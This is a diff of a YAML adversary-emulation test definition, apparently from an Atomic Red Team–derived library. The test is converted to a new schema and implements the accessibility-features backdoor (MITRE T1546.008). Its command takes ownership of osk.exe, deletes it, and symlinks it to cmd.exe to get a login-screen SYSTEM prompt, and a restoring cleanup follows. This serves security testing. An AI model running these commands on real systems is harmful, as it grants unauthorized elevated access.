@@ -1,26 +1,16 @@
-- id: 81ab52de-aa9e-53c2-934a-13c8e2ee5c0f
+- requirements: []
   name: Soumaia ART Tests - Create Symbolic Link From osk.exe to cmd.exe
   description: Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in. (requires elevation)
   tactic: privilege-escalation
-  technique:
-    attack_id: T1546.008
-    name: 'Event Triggered Execution: Accessibility Features'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
-          takeown /F %windir%\System32\osk.exe /A
-          icacls %windir%\System32\osk.exe /grant Administrators:F /t
-          del %windir%\System32\osk.exe
-          mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
-        cleanup: |-
-          takeown /F %windir%\System32\osk.exe /A
-          icacls %windir%\System32\osk.exe /grant Administrators:F /t
-          del %windir%\System32\osk.exe
-          copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
-          icacls %windir%\system32\osk.exe /inheritance:d
-          icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
-          icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
-          icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
-          icacls %windir%\system32\osk.exe /grant:r Administrators:RX
+  technique_id: T1546.008
+  technique_name: 'Event Triggered Execution: Accessibility Features'
+  executors:
+  - cleanup:
+    - takeown /F %windir%\System32\osk.exe /A & icacls %windir%\System32\osk.exe /grant Administrators:F /t & del %windir%\System32\osk.exe & copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe & icacls %windir%\system32\osk.exe /inheritance:d & icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller" & icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t & icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX & icacls %windir%\system32\osk.exe /grant:r Administrators:RX
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd ) & takeown /F %windir%\System32\osk.exe /A & icacls %windir%\System32\osk.exe /grant Administrators:F /t & del %windir%\System32\osk.exe & mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
+  id: 81ab52de-aa9e-53c2-934a-13c8e2ee5c0f
